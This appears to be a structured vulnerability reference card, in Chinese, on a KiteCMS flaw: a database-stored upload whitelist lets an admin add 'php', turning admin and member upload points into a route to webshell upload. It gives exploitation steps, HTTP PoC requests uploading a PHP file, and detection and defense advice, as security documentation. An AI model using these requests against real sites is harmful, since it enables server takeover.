---
id: web-php-rce-kitecms-admin-upload-ext-config-database-php-upload
title: KiteCMS 后台配置把上传后缀白名单写入数据库，任意上传点放行 PHP 文件 RCE
type: scenario
domain: web
path: web/php/rce
technique: kitecms-site-config-upload-ext-database-php-upload
aliases:
- KiteCMS 任意文件上传
- upload_image_ext 配置 php
- SiteConfig::saveCofig 上传后缀
- KiteCMS 会员头像上传 getshell
tags:
- php
- kitecms
- thinkphp
- file-upload
- rce
- cms
- config
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V644
  verified_at: '2026-11-13T03:32:26+08:00'
  notes: 已对照原文与61张截图核对：img05/14 后台配置追加php并POST /admin/site/config.html?config_name=uploadFile；img06 源码 foreach SiteConfig::saveCofig 写库（已修正卡片 saveConfig→saveCofig）；img07 kite_site_config 写入 jpg,png,gif,php；img09/10 UploadFile 构造默认配置与库值 array_merge；img12 check 使用合并后 ext/size；img15 Local::upload rule(date)->move；img16/17 上传 z.php 成功并访问 phpinfo；img45/54 前台 Member::avatar 同一 UploadFile；img48 会员发布页2处上传点。dedup top 候选为通用后台配置追加php与BossCMS实例，非同链。未验证点：未复跑PoC；frontmatter 无 sources/source_url。
---

# 一句话结论

KiteCMS 把上传后缀白名单存在 `kite_site_config` 表并由后台“配置-上传”页动态修改：`/admin/site/config.html?config_name=uploadFile` 用 `Request::param()` 接收全部参数逐项 `SiteConfig::saveCofig()` 写库，`UploadFile` 构造时以默认配置与库中值 `array_merge`，`File::check()` 直接使用合并后的 `upload_image_ext`；后台管理员在图片类型中追加 `php` 后，后台 `/admin/upload/uploadfile.html` 与前台会员头像上传等所有调用 `UploadFile->upload()` 的入口都会接受 `.php` 文件并落到 `/upload/日期/随机.php`，访问即执行。

# 原理

- **配置读写的闭环**：`Site::config()` 在 AJAX 请求中把 `Request::param()` 的所有键值逐个 `SiteConfig::saveCofig($site_id, $k, $v)` 写入站点配置表（方法名拼写即源码原文）；`UploadFile::__construct($site_id)` 读取 `Config::get('site.uploadFile')` 默认值，再遍历配置键用 `SiteConfig::getCofig($site_id,$k)` 覆盖，最后 `array_merge` 成 `$this->config`。
- **校验使用合并后的配置**：`UploadFile::upload($file, $fileType='image')` 对 `image/video/attach` 分别调用 `$file->check(['ext'=>$this->config['upload_image_ext'], 'size'=>...])`；后缀白名单完全来自配置，没有代码层固定白名单。
- **前后台共用同一上传类**：后台 `app\admin\controller\Upload::uploadFile()` 与前台 `app\member\controller\Upload::avatar()` 都走 `new UploadFile($this->site_id)` + `upload($file)`（默认 fileType=image），因此一旦配置中加入 `php`，任何能到达上传点的账号（含仅注册的会员）都能上传 PHP。
- **落盘路径可预测**：`Local::upload()` 用 `$file->rule('date')->move($uploadPath)` 按日期目录存放、随机文件名，返回的 `url` 形如 `/upload/20230308/<hash>.php`，直接访问即由 PHP 解析执行。
- **为什么是漏洞而非正常功能**：上传后缀白名单本应只允许图片，但被实现为“后台可任意编辑的数据库配置”且校验直接信任该配置；管理员权限被滥用或后台弱口令即可把全站所有上传点变成 getshell 入口。原文环境默认配置仅为 `jpg,png,gif`，攻击者修改后立即生效。
- **利用价值**：上传目录通常有执行权限，且该 CMS 的前台会员注册上传入口降低了利用门槛（先改配置→再前台注册上传），无需后台管理员会话即可完成后半段。

# 触发条件

- 能进入后台“系统-配置-上传”页（管理员权限/弱口令/其他后台入口），或能直接写 `kite_site_config` 表。
- 站点存在可访问的上传功能点（后台 `upload/uploadfile`、前台会员头像 `avatar` 等）。
- Web 服务器对上传目录中的 `.php` 有解析权限（默认 Apache/Nginx+PHP-FPM 配置）。
- 上传大小不超过配置限制（如 2048/10240，按 1MB=1024KB 换算）。

# 利用步骤

1. 登录后台，打开 `/admin/site/config.html?config_name=uploadFile`，在“图片类型”中追加 `,php`（或直接向配置接口发 POST）。
2. 保存后确认数据库中 `upload_image_ext` 已含 `php`（原文截图：`jpg,png,gif,php`）。
3. 后台：`POST /admin/upload/uploadfile.html`（multipart，`file` 字段名为 `z.php`，内容 `<?php phpinfo();?>`），响应返回 `url: /upload/20230308/<hash>.php`。
4. 前台：注册会员后进入会员中心发布页/头像设置，选择改名为 `.php` 的文件上传，同样获得可访问 URL。
5. 访问返回的 URL 执行 PHP，得到 phpinfo/webshell。

# PoC

```http
POST /admin/site/config.html?config_name=uploadFile HTTP/1.1
Content-Type: application/x-www-form-urlencoded

upload_type=local&upload_image_ext=jpg%2Cpng%2Cgif%2Cphp&upload_image_size=2048&upload_video_ext=rm%2Crmvb&upload_video_size=10240&upload_attach_ext=doc%2Cxls&upload_attach_size=10240&upload_path=upload
```

```http
POST /admin/upload/uploadfile.html HTTP/1.1
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="z.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
------x--
```

响应 `{"code":200,"data":{"url":"/upload/20230308/<hash>.php"}}`，访问该 URL 即执行。

# 变体与关联

- 视频/附件类型（`upload_video_ext`/`upload_attach_ext`）同样可配置，可上传 `.php` 伪装成任意类型。
- 前台会员上传点 `Member::avatar()` 是同一 `UploadFile` 的另一入口，只要求普通会员身份。
- 与通用上传绕过不同：这里没有 MIME/文件头对抗，漏洞根源是“白名单可被后台写库”。

# 检测与防御

- 检测：审计 `site/config` 对 `upload_*_ext` 的修改，尤其是出现 `php/php5/phtml/jsp` 等可执行后缀；监控上传目录新增 `.php` 文件与随后访问。
- 防御：上传白名单在代码/配置文件中固定，不提供后台修改或至少不允许脚本后缀；上传目录禁止脚本执行（Nginx location 拒绝 .php）；上传文件重命名为非脚本后缀并做内容校验；后台最小权限与强口令；对 `kite_site_config` 变更做审计告警。
